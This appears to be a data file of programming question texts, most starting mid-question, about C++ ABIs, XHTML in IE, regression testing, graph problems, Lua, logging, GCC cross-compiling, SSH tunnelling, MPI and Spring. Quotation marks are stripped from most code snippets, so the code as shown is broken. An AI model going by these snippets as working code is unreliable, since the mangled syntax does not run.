    "source": "Is there an interface definition language for software libraries? <eos> Suppose I am writing a C++ library that I intend to distribute in binary form, with interfaces from other languages (e.g. Python). The 'easy' approach of just compiling the library and distributing the DLL or Framework does not work well.For it to work you need to compile the library with every supported compiler and every supported compiler option, and bad things can happen if you don't.The problem is because C++'s ABI is in general not stable, and the ABI of the STL is definitely not stable. A sort of solution is to stick to 'simple' C++ in your public API - simple classes with basic types. The problem with that is you don't get to use the STL's nice types like std::string and `std::vector and end up reimplementing them.So I'm wondering if there is a better solution using a library Interface Definition Language (IDL). There are loads of these for network protocols, like Thrift, Protobuf, gRPC, CapnProto, etc. Is there one for libraries?The ideal solution would then take this IDL file, generate a C->C++ wrapper around the C++ library, so that its ABI is now the C ABI. It could then also generate open source wrappers around the C library for whatever language you wanted (including C++).I know it is kind of insane to wrap C++ with a C API and then wrap that with a C++ API. But I can't see a better way.Does this exist? Is it insane? Is there a better way?",

However, sometimes someone is using the forum from IE and isn't able to install MathPlayer (maybe they're on a public machine somewhere).  Then IE (at least 6&7) complains about the XHTML and offers just to download the file.I read on the w3c site how to get around this using an XSL transformation (http://www.w3.org/MarkUp/2004/xhtml-faq#ie).  When I put this in place, I found that Chrome was now complaining vociferously about undefined entities (the specific one was &nbsp; but testing shows that that's not relevant).Bizarrely, I can get round this by manually declaring the entities in the DOCTYPE:<!DOCTYPE html PUBLIC -//W3C//DTD XHTML 1.1 plus MathML 2.0 plus SVG 1.1//EN http://www.w3.org/2002/04/xhtml-math-svg/xhtml-math-svg-flat.dtd [<!ENTITY nbsp &#160;>]>but I'd rather not do this for the whole gamut of entities possible.

Yet it's not clear if something like this exists, and if, how it would possibly be called.Ordinary unit tests combine the test logic and the expected outcome. In essence the testing framework only checks for booleans (did this match, did the expected result result). To generalize, the test code itself references the audited functions, and also explicites the result values like so:unit::assert(  test_me() == 17  )What I'm looking for is a separation of concerns. The test itself should only contain the tested logic. The outcome and result data should be handled by the unit testing or assertion framework. As example:unit::probe(   test_me()   )Here the probe actually doubles as collector in the first run, and afterwards as verification method. The expected 17 is not mentioned in the test code, but stored or managed elsewhere.How is this scheme called? Or how would you call it? I hope I can find some actual implementations with the proper terminology.Obviously such a pattern is unfit for TDD. It's strictly for regression testing. Also obviously, it cannot be used for all cases. Only the simpler test subjects can be analyzed that way, for anything else the ordinary unit test setup and assertion steps are required. And yes, this could be manually accomplished by crafting a ResultWhateverObject, but that would still require hardwiring that to the test logic.Also keep in mind that I'm inquiring for use with scripting languages, and not about Java. I'm aware that the xUnit pattern originates there, and why it's hence as elaborate as it is.Btw, I've discovered one test execution framework which allows for shortening simple test notations to:test_me();   // 17While thus the result data is no longer coded in (it's a comment), that's still not a complete separation and of course would work only for scalar results.",

Now, if in $SEQ$ we substitute $x_j$ with $f(x_j)$ we obtain a sequence $NODESEQ$ of nodes.We want to start from $s$ and end in $t$ so trivially $x_1 = s, x_m = t$.For example: $NODESEQ = (s,v_1,v_7,v_9,v_1,v_7,t)$A valid node assignment is an assignment such that if we substitute each $x_{i_j}$ with $f(x_{i_j})$ in the sequence $SEQ$ we obtain a valid path from $s$ to $t$.Problem 1:Given a directed graph $G$ with one source and one sink and a sequence of variables $SEQ$ check if a valid node assignment exists.I'm not an expert, but if we take $m=n=|V|$ and $SEQ=(x_1,...,x_n)$ then the problem becomes the Hamiltonian Path problem. Informally HAM-PATH can be reduced to Problem 1, adding a source node $s$ and a sink node $t$, two extra variables at the beginning and end of $SEQ$: $(x_s,x_1,...,x_n,x_t)$ and edges $(s,u), (v,t)$ for every $u,v \\in V$, (hence Problem 1 is in NPC).But we can modify it and drop the condition that if $i \\neq j$ then $f(x_i) \\neq f(x_j)$ i.e we can assign the same node $v$ to more than one $x_i$ (I call it relaxed node assignment). We get an (apparently) simpler problem.Problem 2:Given a directed graph $G$ with one source and one sink and a sequence of variables $SEQ$ check if a valid **relaxed node assignment** exists.An informal way to describe the problem: we have a chain made of segments. Now we wrap it up in some casual order and join some innermost endpoints. The problem 2 consists in checking if such wrapped chain can fit in a given graph.Is this problem known?Is it still an NPC problem?",

The purpose of this algorithm is to sort every word into its corresponding array based on its letter pattern. For example, the word little would have the letter pattern of ABCCDE, and hello would have the letter pattern of ABCCD. The purpose of this sorting algorithm is to use it to decode substitution ciphers; however, this is the only working code I've written so far for it. This code works, and I have a sorted dictionary file here.However, I want to know how I might be able to improve this algorithm to make it as fast and efficient as possible. Even though its only run once, I want to get into the habit of writing efficient code. To break down exactly what's going on in the algorithm I've added a few comments, but to elaborate it loads each word from the dictionary and stores it in an array, in which I then iterate through the array and each letter of the word. The clpl variable starts at 'A', and it checks if it exists in a temp object. If it does, it adds that letter to the letter pattern, if it does not, it creates a new property on the object and assigns it the current letter as a value. It adds the assigned letter to lp, which is initialized as an empty string.The line clpl = String.fromCharCode(clpl.charCodeAt(0) + 1);gets the next letter. After it has iterated through each letter in the word, it checks if the current letter pattern exists in the sortedDictionary object, if it does it pushes it to an array containing all words with its letter pattern. If it does not, it creates a new array for that letter pattern and pushes the current word to that array. After it has gone through every word, it writes the sortedDictionary object to an external JSON file. //load file systemvar fs = require(fs);//load jsonfilevar jsonfile = require(jsonfile);//create var for dictionary filevar dictFile = american-english, sortedDictFile = sortedDictionary.json;//empty object to hold sorted dictionary according to letter patterns//empty dictionary array to hold wordsvar sortedDictionary = {}, dictionary = [];//declare variables for usevar temp, clpl, lp, word;console.time(Dictionary Sort);fs.readFile(dictFile, utf8, function(error, data){    if(error) throw error;    //push all words into an array     dictionary = data.toString().split(\\n);    for(var i = 0; i < dictionary.length; i++){        //set word to current word in dictionary        word = dictionary[i];        //set temp to empty object, clpl to A, and lp to an empty string        //this is used to get the current letter pattern        temp = {}, clpl = 'A', lp = '';        for(var j = 0; j < word.length; j++){            if(word[j] in temp){              lp += temp[word[j]];            } else {              temp[word[j]] = clpl;              lp += clpl;              clpl = String.fromCharCode(clpl.charCodeAt(0) + 1);            }        }        //if letter pattern of word exists in sorted dictionary        if(lp in sortedDictionary){            //add word to the array of words with same letter pattern            sortedDictionary[lp].push(word);        } else {            //if letter pattern is new, create new array to store words            sortedDictionary[lp] = [];            //add word to the array of words with same letter pattern            sortedDictionary[lp].push(word);        }    }    //write the sortedDictionary object to the sortedDictionary.json file    jsonfile.writeFile(sortedDictFile, sortedDictionary, {spaces: 2}, function(error){        if(error) throw error;    });    //time to sort and write to json file - Dictionary Sort: 687ms (137602 lines)    console.timeEnd(Dictionary Sort);});",

Sometimes, gl functions want a pointer to some data, for example:glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA,    GL_UNSIGNED_BYTE, oh_crap_a_pointer)In these cases, the luaglut bindings take a light userdata containing the pointer. In the luaglut demos, a small example library called memarray does the work of setting up a C array and returning a pointer to it as a light userdata.You might use memarray something like this:require 'memarray'function loadTexture(filename)  local file = assert(io.open(filename, 'rb'))  local data = file:read('*a')  file:close()  local array = memarray('uchar', #data)  array:from_str(data)  return arrayend-- ... laterlocal texture = loadTexture('whatever.rgba')glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 32, 32, 0, GL_RGBA,    GL_UNSIGNED_BYTE, texture:ptr())That got me thinking, why do we need memarray at all? Lua strings should be binary safe; all we really need is to get a pointer to the string returned fromfile:read('*a') as a light userdata. It would look something like this:function loadTexture(filename)  local file = assert(io.open(filename, 'rb'))  local data = file:read('*a')  file:close()  return dataend-- ... laterlocal stringpointer = require 'stringpointer'local texture = loadTexture('whatever.rgba')glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 32, 32, 0, GL_RGBA,    GL_UNSIGNED_BYTE, stringpointer.get(texture))Of course we pass the string around instead of the pointer, because the GC could free the memory the string was in if there are no more references to it, invalidating the pointer. Internally Lua strings are immutable and passed by reference anyway, so this is no big deal.Code#include <lua.h>#include <lualib.h>#include <lauxlib.h>int get_pointer(lua_State *L){    luaL_checktype(L, 1, LUA_TSTRING);    lua_pushlightuserdata(L, (void *)lua_tostring(L, 1));    return 1;}int luaopen_stringpointer(lua_State *L){    const luaL_Reg api[] = {        {get, get_pointer},        {NULL, NULL}    };#if LUA_VERSION_NUM == 501    luaL_register(L, stringpointer, api);#else    luaL_newlib(L, api);#endif    return 1;}It's really tiny, but my C is rusty so maybe I did something stupid.

I always have RPi's BPM = 98% normal BPM .It also works with frequencies, that are 2% smaller ...I'm using a Raspberry Compute Module (CM1) with a Wolfson WM8731 audio codec.I tried everything I found on the internet to play files in real time, have the best scheduling priority, but still that problem.

In other words, how do you determine the interactivity of the caller of the script?  Put yet another way, how do you know whether the parent shell is interactive or not?Just to further clarify, I'm not trying to find the name of the nearest interactive ancestor, I'm just trying to figure out if the immediate parent is interactive or not.If this varies from shell to shell, I'm most interested in zsh, but also in bash.",

    "source": "Logging in a latency sensitive system <eos> Requirements:My application is latency sensitive. Millisecond level responsiveness matters. Not all the time, but when it acts, it needs to be fast.My application needs to log information about what it's done in those times.The actual writing of the logs does not need to be that fast, just the actions.However, the log files need to be written at human speed, in other words, I cannot set immediateFlush to false.So, obviously, certain kinds of logging are getting offloaded to another thread. I am using logback as a framework, but for certain sorts of log messages I still want to offload the work to another thread.Here is how the system currently works:Each part of the latency sensitive system gets a particular logger interface injected. Each of these log methods has a signature specific to the sorts of things I know the logger will need to log.A SimpleLogger implementation is written for each case. This writes to the log on the same thread.I have also written a ThreadedLogger which implements ALL the logging interfaces, and gets a backing logger implementation injected for each sort of logger.Whenever a log method is called in ThreadedLogger, it wraps the request in an SomeLogObject implements LogCommand, throws the objected into a LinkedBlockingQueue, and returns. This is similar to the Go4 Command patternThere is a consumption thread that blocks on BlockingQueue.take() waiting for log objects to come in. When they do, it calls LogCommand.execute(), which calls the appropriate method in the backing Logger in ThreadedLogger.Currently the LogCommand implementations are very stupid. They just call the appropriate method in the proper injected logger.I am trying to decide if I should refactor this system. Currently, if I need to create a new place to do these offloaded logs, I have to create:A new interfaceA new implementation of this interfaceTwo new DI bindings (one for the simple logger, one for the ThreadedLogger backer)A new LogCommand implementationA new method for creating this LogCommand objectCode for injecting and storing as a field the appropriate logger in ThreadedLogggerIt seems to me that it would be a lot simpler to offload the creation of the LogObject to the calling threads, but I am concerned that I'm exposing too much of the internal workings of the log system if I do that. Not that this is necessarily a problem, but it seems unclean. Another possibility would be to combine the functionality of the simple logger implementations with their respective log objects, so the objects change from being I am an object that does logging when given log data to I am a log event that knows how to log myself, and these objects can be created by a log factory.",

For instance, you can get the beginning of a hint of what things like Polymorphism or even Monad are about with the help of a little Greek/Latin. At the very least, once you've learned the concept, the word itself appears to go along with it well. I guess that's part of why we name things names, to make mental representations and associations more fluent.I found Functor to be a tougher nut to crack. Not so much the C++ meaning -- an object that acts (-or) as a function (funct-), but the various functional meanings (in ML, Haskell) definitely left me puzzled.From the (mathematics) Functor Wikipedia article, it seems the word was borrowed from linguistics. I think I get what a function word or functor means in that context - a word that makes function as opposed to a word that makes sense. But I can't really relate that to the notion of Functor in category theory, let alone functional programming. I imagined a Functor to be something that creates functions, or behaves like a function, or short for functional constructor, but none of those seems to fit...How do experienced functional programmers reason about this ? Do they just need any label to put in front of a concept and be fine with it ? Generally speaking, isn't it partly why advanced functional programming is hard to grasp for mere mortals compared to, say, OO -- very abstract in that you can't relate it to anything familiar ?Note that I don't need a definition of Functor, only an explanation that would allow me to relate it to something more tangible, if there is any.",

I have read the documentation carefully but I'm still unable to cross compile it for 64bit system. I have also gone through this guide. But my requirement is to build GCC in /tmp/xxx directory. But the --with-sysroot & --with-native-system-header-dir flags are messing up the compilation. According to the documentation of GCC, I need to use --with-sysroot flag along with --with-native-system-header-dir.--with-system-header-dir accepts a directory name where the header files are installed. In my case it is ${TOOLS_DIR} and this should be an absolute path, which it is. And, --with-sysroot requires the root path of the folder where the compilation is being done. In my case, it is ${INSTALL_DIR}.INSTALL_DIR=/tmp/gcc-compileTOOLS_DIR=${INSTALL_DIR}/toolsAccording to the Linuxfromscratch guide, I should create a folder on the root system of the host. But in order to do that I will need sudo permission which I don't have. So, I thought to compile GCC in a subdirectory rather than what was mentioned in the book (because all the users get read/write permission for /tmp directory).Now, GCC stops with an error that it cannot find the system header directory. And, it tries to search in /tmp/gcc-compile/tmp/gcc-compile/tools/include, which is the wrong path.The options that I have used are:sed -i s#/tools#${TOOLS_DIR}#g ../gcc-4.8.3-pure64_specs-1.patchpatch -Np1 -i ../gcc-4.8.3-branch_update-1.patchpatch -Np1 -i ../gcc-4.8.3-pure64_specs-1.patchprintf '\\n#undef STANDARD_STARTFILE_PREFIX_1\\n#define STANDARD_STARTFILE_PREFIX_1 %s/lib/\\n' ${TOOLS_DIR} >> gcc/config/linux.hprintf '\\n#undef STANDARD_STARTFILE_PREFIX_2\\n#define STANDARD_STARTFILE_PREFIX_2 \\n' >> gcc/config/linux.hmkdir   ${BUILD_DIR}  &&cd      ${BUILD_DIR}  &&AR=ar LDFLAGS=-Wl,-rpath,${CROSS_DIR}/lib   \\../configure --prefix=${CROSS_DIR}            \\             --build=${HOST}                  \\             --target=${TARGET}               \\             --host=${HOST}                   \\             --with-sysroot=${INSTALL_DIR}    \\             --with-local-prefix=${TOOLS_DIR} \\             --with-native-system-header-dir=${TOOLS_DIR}/include \\             --disable-nls                    \\             --disable-static                 \\             --enable-languages=c,c++         \\             --enable-__cxa_atexit            \\             --enable-threads=posix           \\             --disable-multilib               \\             --with-mpc=${CROSS_DIR}          \\             --with-mpfr=${CROSS_DIR}         \\             --with-gmp=${CROSS_DIR}          \\             --with-cloog=${CROSS_DIR}        \\             --with-isl=${CROSS_DIR}          \\             --with-system-zlib               \\             --enable-checking=release        \\             --enable-libstdcxx-timeWhile setting the options, I have written ${TOOLS_DIR}/include, then why is it the GCC is trying to look into ${INSTALL_DIR}/${TOOLS_DIR}/include?

    "source": "Correctly disposing objects upon server termination <eos> I am working on a large C++ project. It consists in a server that exposes a REST API, providing a simple and user-friendly interface for a very broad system comprising many other servers. The codebase is quite large and complex, and evolved through time without a proper design upfront. My task is to implement new features and refactor/fix the old code in order to make it more stable and reliable.At the moment, the server creates a number of long-living objects that are never terminated nor disposed when the process terminates. This makes Valgrind almost unusable for leak detection, as it is impossible to distinguish between the thousands of (questionably) legitimate leaks from the dangerous ones.My idea is to ensure that all objects are disposed before termination, but when I made this proposal, my colleagues and my boss opposed me pointing out that the OS is going to free that memory anyway (which is obvious to everybody) and disposing the objects will slow down the shutdown of the server (which, at the moment, is basically a call to std::exit). I replied that having a clean shutdown procedure does not necessarily imply that one must use it. We can always call std::quick_exit or just kill -9 the process if we feel impatient.They replied most Linux daemons and processes don't bother freeing up memory at shutdown. While I can see that, it is also true that our project does need accurate memory debugging, as I already found memory corruption, double frees and uninitialised variables.What are your thoughts? Am I pursuing a pointless endeavour? If not, how can I convince my colleagues and my boss? If so, why, and what should I do instead?",

    "source": "Registering 3D-NIR image to thermal image and vice versa <eos> In the past I have thought a bit about how to register a NIR-image and a thermal image and noticed that this is not trivial - one statement was that if I had the depth information for each pixel, the task would be much easier.Now consider having a 3D-NIR camera (e.g. asus xtion) and a thermal camera and I want to map the thermal information to the depth map (the 3d cloud) or vice versa and the NIR information to the thermal information (and vice versa). I thought I could do it simply like this:Conduct a stereo camera calibration for the two cameras (-> R1,R2,T)Use R1, R2 and T to transform the 3D points from 3D-NIR to the thermal camera's coordinate systemUse the camera matrix of the thermal camera to project the 3D points to its image planeNow I know where the 3D points fall in the thermal image, which gives me a depth value (and intensity value, because the depth map and NIR-image are aligned) for each pixel in the thermal image.Which to me sounds similar to the procedure described in this answer by D.W..However, I can't find any article describing this method. Always there seems to be some form of feature matching step, e.g. here.Also, thinking about this, the above solution can not really work, I believe. Consider the case where the two cameras look at an object from different sides. The 3D camera will calculate the depth for a point p1 in the world. When projecting p1 to the thermal camera's image plane it will fall in pixel x. However, since the thermal camera looked at another side of the object, another point in the world p2 actually formed pixel x when the thermal camera took the image - and thats what the measured temperature in x is for (i.e., p1 and p2 roughly lie on a line viewed from the thermal camera).So, all in all:Is my statement that the outlined solution can't always work correct?Under which circumstances does the outlined solution work?What do I need to keep in mind when building the setup?How else to go about this problem?

Or at least, I used to do that until a couple of years ago when I first read the somewhat-infamous EF Vote of No Confidence:The hypotheses that once supported the pursuit of canonical data models didnt and couldnt include factors that would be discovered once the idea was put into practice. We have found, through years of trial and error, that using separate models for each individual context in which a canonical data model might be used is the least complex approach, is the least costly approach, and the one that leads to greater maintainability and extensibility of the applications and endpoints using contextual models, and its an approach that doesnt encourage the software entropy that canonical models do.The essay presents no evidence of any kind to support its claims, but did make me question the CDM approach long enough to try the alternative, and the resulting software didn't explode, literally or figuratively.  But that doesn't mean a whole lot in isolation; I could have just been lucky.So I'm wondering, has any serious research been done into the practical, long-term effects of having a canonical model vs. contextual models in a software system or architecture?Or, if it's too early to be asking that, then have any developers/architects written about personal experiences switching from a CDM to independent contextual models, or vice versa, and what the practical effects were on things like productivity, complexity, or reliability?What about the differences at different levels, i.e. using the same model across a single application vs. using it across a system of applications or an entire enterprise?(Facts only, please; war stories are welcome but no speculation.)",

Upon investigating, I found a lot of core.* files scattered around my public_html directory. Each one is more than 5MB in size but no more than 6MB. The * part is all numbers (in programming regex, that should be core\\.\\d+).I downloaded one and checked the contents. There was a lot of balderdash characters (NUL mostly, but also a scattering of ETB, ETX, STX) but there's this block of readable text which says:This text is part of the internal format of your mail folder, and is nota real message.  It is created automatically by the mail system software.If deleted, important folder data will be lost, and it will be re-createdwith the data reset to initial values.Pretty self-explanatory.

However, lately, I seem to notice a spike in the spam for my vanity mail. (Note: the comments system is covered by a captcha but every now and then some get through. My vanity email has a spam filter but it isn't as good as I'd like).Next, if this is a feature, can I turn it off? Is it advisable to? I've only 150MB so you see why I'm fretting over a 50MB spike.Some final details: my only server-side scripts are in PHP. The directory which accumulated the most number of these core files is the one containing the Wordpress-managed subdomain of my site. I manage my server through CPanel. Lastly, I decided to delete this files and after some checking nothing seems amiss in my websites nor in my mail.

I believe the anonymous function is used in case a connection to a different database needs to be established, a different function will be defined for that. In that case, will it be alright to move the anonymous function to the factory class itself? With this approach  just passing the PDO parameters to the constructor will achieve the same as the original answer.Something like:class StructureFactory{    protected $provider = null;    protected $connection = null;    public function __construct( $PDO_Params )    {        $this->provider = function() {            $instance = new PDO($PDO_Params[dsn], $PDO_Params[username], $PDO_Params[password]);            $instance->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);            $instance->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);            return $instance;        };    }    public function create( $name)    {        if ( $this->connection === null )        {            $this->connection = call_user_func( $this->provider );        }        return new $name( $this->connection );    }}",

To estimate $\\alpha_i$ depends on the reported shares and solutions.A reward function $ R\\colon H \\mapsto [0,1]^n$ is a function from a history transcript to an allocation $ \\{a_i\\}_{i=0} ^ {n} $ with $ \\sum_i a_i =1 $. I don't understand this? What allocation does the authors mean?What I somewhat understand from next para is $ H(k) = b = (y_1(k), \\cdots, y_i(k) ) $ where $y_i(k)$ is no of shares reported by player $i$ in round $k$.This I am basing on $H$ contains for each miner $i$ the total no of shares $b_i$ reported in that round. History transcript is given by a vector $b \\in N^n $.Also what do they mean when they say  We use vector notation for $b$, so $b_1 + b_2 $ means component wise addition of these, and  $\\|b\\|_1 = \\sum_{i=1}^n b_i $ is the sum of components of $b$Could someone explain with examples or in a more concrete way ?Also any suggestions for understanding this paper would be much appreciated.

Especially when it comes to things like making the results conditional on operations performed on the data. Arguably with modern engines effectively JIT'ing + caching the compiled version of your query it'd make sense on the surface.The question is whether or not leveraging your database engine in this way is inherently bad design practice (and why).

Until now I have used a local SQL server database that I always clear and prefill with some data before each unit test and then use the real MeasurementsDbContextto perform the test operations. But this approach is very time consuming and I would prefer to also mock the DbContext and provide some data directly from code. But when I change the code and inject the DbContext to the MeasurementsDataService, the DbContext lives through the whole livetime of the application what I consider as bad practise. Creating a new instance of IMeasurementsDataService every time I need it also seems not a solution because than I loose the ability to unit test the ViewModels properly. I am thinking of providing some kind of MeasurementDataServiceFactory to the ViewModels, that creates instances of the data service when requested and can be mocked to provide some different data service for testing. The the data service can have a DbContext per instance.Do you think this is a good solution or does anyone has a better and easier to handle solution to inject data services to view models and contexts to data services without having a DbContext living for the whole application runtime?",

Why does VB break SSH? <eos> VirtualBox seems to break my SSH ProxyCommand... here are the details:I want to open an SSH connection from my laptop to desktop over an SSH (reverse) tunnel. I want to do that in one step using ProxyCommand (and netcat). It works when run from the installed OS on my laptop. It fails when run from a VirtualBox guest on my laptop.My normal setup is that Kubuntu 12.04 is running in VirtualBox on the desktop and Kubuntu 12.04 is installed directly on my laptop. This works fine.However, if I try to do the exact same thing with a Kubuntu 12.04 VirtualBox instance on my laptop, it fails as I will detail below.Here's what my SSH tunnel looks like:laptop--->nat--->middleman<--nat<--desktopThe desktop & laptop run Kubuntu 12.04 regardless of whether I'm using VirtualBox; and the middleman is Ubuntu 8.04. I'll describe my SSH tunnel in more detail. Regarding this leg:middleman<--nat<--desktop...here is how it is established:autossh -M 5234 -N -f -R 1234:localhost:22 user@middleman.comThat part is automatic and trouble-free.From the laptop:laptop--->nat--->middlemanI can connect to middleman and then from the middleman to the desktop in two steps under all conditions:me@laptop:~$ ssh -i ~/.ssh/id_rsa admin@middleman      admin@middleman:~$ ssh -i ~/.ssh/id_rsa localhost -p 1234To do this in one step I use netcat (nc) on middleman and I edit my SSH config file on laptop to use ProxyCommand and nc:me@laptop:~/.ssh$ nano configThe contents are:Host family_desktops  ProxyCommand ssh middleman_fqdn nc localhost %p  User admin  PasswordAuthentication no  IdentityFile ~/.ssh/my_id_rsaWhere middleman_fqdn is like middleman.comThen I just connect to desktop in one step:me@laptop:~$ ssh family_desktops -p 1234Here's the problem. This works when run directly from my laptop (where Kubuntu 12.04 is installed). But when I run it from VirtualBox instance of Kubuntu 12.04 (guest) on my laptop, it does not work. SSH asks for the password for middleman. There is no password set up, so I cannot connect. The strange thing is that running the two separate commands allows me to connect to my desktop and it doesn't ask for a password. The ssh -vvv option shows no errors and nothing helpful.I have been troubleshooting all day and I cannot find any difference in settings between the VirtualBox instance and the host OS on my laptop. I use the exact same id_rsa keys (public & private), the same user, and auth.log on the middleman server indicates it sees the same IP address in both cases. So why would running VirtualBox on my laptop make this SSH tunnel stop working (at least working in one step)?",

    "source": "Detecting cycles in a directed graph without using mutable sets of nodes <eos> I recently came across the classic algorithm for detecting cycles in a directed graph using recursive DFS. This implementation makes use of a stack to track nodes currently being visited and an extra set of nodes which have already been explored. The second set is not strictly required, but it is an optimization to prevent iterating over path suffixes that have previously been determined not to be part of a cycle.I had no trouble implementing this in Python by simply creating a (mutable) set object and sharing it between all branches of the recursion.My attempt to reimplement this algorithm in Haskell turned out to be much worse (and still isn't as efficient as the original).I would like some pointers about how to restructure this so that it isn't a mess of recursive folds, but without giving up the set of visited, nodes, which lets me avoid taking branches that have already been explored.import Data.Maybeimport qualified Data.IntMap.Strict as Mimport qualified Data.Char as Cimport Debug.Traceedges :: Stringedges =  a b\\n\\  \\a c\\n\\  \\b c\\n\\  \\b d\\n\\  \\c d\\n\\  \\c e\\n\\  \\e f\\n\\  \\e g\\n\\  \\f g\\n\\  \\g ctype Node = IntparseGraph :: String -> M.IntMap [Node]parseGraph = foldr go M.empty . lines  where go line m = let [key, rule] = map ruleToKey (words line)                    in M.insertWith inserter key [rule] m        inserter [rule] olds = rule:oldsruleToKey :: String -> NoderuleToKey rule = C.ord (head rule) - 97keyToRule :: Node -> StringkeyToRule key = return $ C.chr (key + 97)hasCycle :: M.IntMap [Node] -> Maybe [Node]hasCycle m = reverse <$> ret  where dummyM = M.insert phantom (reverse $ M.keys m) m        phantom = -1        (_, _, ret) = hasCycleHelper dummyM phantom ([], [], Nothing)hasCycleHelper :: M.IntMap [Node] -> Node -> ([Node], [Node], Maybe [Node]) -> ([Node], [Node], Maybe [Node])hasCycleHelper rules rule (visited', visiting', cyc) =  trace rendered $    case () of      _ | isJust cyc || rule `elem` visited' -> (visited', visiting', cyc)        | rule `elem` visiting' -> ([], [], Just (takeWhile (/= rule) visiting' ++ [rule]))        | otherwise ->  returned  where    children = M.findWithDefault [] rule rules    (visited, _, ret) = foldr (hasCycleHelper rules) acc children    returned = (rule:visited, visiting', ret)    acc = (visited', rule:visiting', Nothing)    rendered =    Current ' ++ keyToRule rule ++ ',                ++ Visiting ' ++ map (head . keyToRule) visiting' ++ ',                ++ Visited ' ++ map (head . keyToRule) visited' ++ ',                ++ Found  ++ show (map (head . keyToRule) <$> cyc)main :: IO ()main = do  let rules = parseGraph edges      cyc = map keyToRule <$> hasCycle rules  print cycWith output:Current '`', Visiting '', Visited '', Found NothingCurrent 'a', Visiting '`', Visited '', Found NothingCurrent 'c', Visiting 'a`', Visited '', Found NothingCurrent 'e', Visiting 'ca`', Visited '', Found NothingCurrent 'g', Visiting 'eca`', Visited '', Found NothingCurrent 'c', Visiting 'geca`', Visited '', Found NothingCurrent 'f', Visiting 'eca`', Visited 'g', Found Just gecCurrent 'd', Visiting 'ca`', Visited 'eg', Found Just gecCurrent 'b', Visiting 'a`', Visited 'ceg', Found Just gecCurrent 'b', Visiting '`', Visited 'aceg', Found Just gecCurrent 'c', Visiting '`', Visited 'aceg', Found Just gecCurrent 'e', Visiting '`', Visited 'aceg', Found Just gecCurrent 'f', Visiting '`', Visited 'aceg', Found Just gecCurrent 'g', Visiting '`', Visited 'aceg', Found Just gecJust [c,e,g]Because I'm using foldr, it can't abort the search after discovering a cycle.

    "source": "Multilingual sites SEO and canonical <eos> I'm in the process of improving the SEO in one of our client's multilingual sites.  Currently the site passes a user the site in their preferred language by checking for a language cookie set by the system last time it was visited.  If the cookie does not exist it looks for an Accept-Language header from the browser and checks for a language supported by the site. If that fails it defaults to a language based on some preset defaults for GEO-Location.  Once we have a language determined the site will return the page in the language determined with no change to the URL and with all the proper meta tags for that language. So if a Spanish speaking user requests domain.com/venue/access/ then they we'll see Spanish while an English speaker would see English. Of course if the user clicks a language select link with a query string including lang=?? (?? would be es,en, ect.) their cookie will be changed to that language and they'll get that language from that point forward.The problem with this approach is, while usually great for a person, crawlers (currently) don't pass an Accept-Language header when they request a page.  This means that a result shown for people using Google, Bing, ect. will usually be in the default language or sometimes a completely different language depending on the path the crawler has taken to a page and how it decided to index it.  This is killing our SEO and click-though outside of the default language.We're working with two ideas for how we're going to change handling of user language.Version 1 - All languages have a sub-directoryIf a user hits a URL without a language directory we'll check for the users language by following the following steps in order until we get a match.User has cookie for language preference. Check the browser headers for a supported languageFallback to a site default language based on GEO-Location.Once a language has been determined the system will set a cookie, do a 301 direct and add the language sub-directory to the URL which will be parsed by mod-rewrite and passed as a query string parameter.Version 2 - All NEW languages have a sub-directoryThe first time a user hits the site if they hit a URL without a language directory we'll check for the users language by following the following steps in order until we get a match.User has cookie for language preference. Check the browser headers for a supported languageIf a supported language has been detected the system will set a cookie. If the language is not the default language the system will do a 301 direct and add the language sub-directory to the URL if the language is not the default site language which will be parsed by mod-rewrite and passed as a query string parameter.Any input on the better option?How should we deal with Canonical URL's depending on which option we choose, should canonical URL's point to the main URL without the language sub-directory or should they point to the version for the current language sub-directory? The client would like, if possible, to have counters for social networking reflect the totals for a page in all languages and we're assuming having separate sub-directories for language will prevent this, unless we use a canonical to a single URL which will probably screw up crawlers and negate the whole point of the language changes.Is there an ideal solution I might be missing?",

Consider the following situations: (Note: pseudo code)Case (1)MPI_Isend (send_buffer, send_req);    // Do local workMPI_Probe (recv_msg);MPI_Irecv (recv_buffer, recv_req);// wait for msgs to finishMPI_Wait (recv_req);   // <--- Is this needed?MPI_Wait (send_req);   // <--- How about this?So my confusion stems from MPI_Probe in this case. Since this is a blocking call, wouldn't that essentially mean it blocks the caller until message is received? If this is the case, then I think MPI_Waits are unnecessary here.How about the following case?Case (2)MPI_Isend (send_buffer, send_req);    // Do local workMPI_Probe (recv_msg);MPI_Recv (recv_buffer);// wait for msgs to finishMPI_Wait (send_req);   // <--- Is this necessary?Similar to the first case but MPI_Irecv is replaced with its blocking version. In this case, the message is definitely received by the time MPI_Wait is called which means MPI_Isend must have been finished ... Also as a separate question, what do we mean when we say MPI_Probe is blocking? Does it block until all of the message is received by the process or does it only block until meta-data (such as msg size, sender rank, etc) is received? In other words is MPI_Probe + MPI_Irecv any better than MPI_Probe + MPI_Recv ?",

I am looking to move towards a more SOA style of coding our views.  Since the MVC and the REST service would live in the same application, is there a need to use Spring RestTemplate in the code when I need to populate objects into a Model?Right now to GET User and display in the view, the Spring MVC talks to a DAO and then adds the User into Model.  After reading a few things here on SO and Spring's Site it seems like RestTemplate could be used to get the data from a REST service and then insert into the model (if it came from a 3rd party).Is there any reason why code should (or shouldn't) move to using the RestTemplate for internal REST calls instead of just using the DOA and such?  I assume going towards SOA means moving into this style, but it seems a little clunky for calling a service that is within the same application.  But I also see the value add of having the service exist once and using it multiple times, updating in one spot instead of all over so any front end web code would be automatically updated with any changes to the service layer.Example:@RequestMapping(value={showUserTable},method={RequestMethod.GET})public String showUserTable(Model model){  List<User> users = User.getAll(); //DAO nonsense here, assume List exists  model.addAttribute(users, users);  return userTable; // returns a jsp simply looping through the list and displaying.}Is there any reason to go towards complicating these to use the internal REST Service in favor of the encapsulation I gain of SOA, or is there a cleaner way to consume these services?@RequestMapping(value={showUserTable},method={RequestMethod.GET})public String showUserTable(Model model){  List<User> users = restTemplate.getForObject(http://example.com/users, User.class);  // or however I use restTemplates, havent done it yet so still fuzzy but shouldnt be too tricky.      model.addAttribute(users, users);  return userTable; // returns a jsp simply looping through the list and displaying.}",

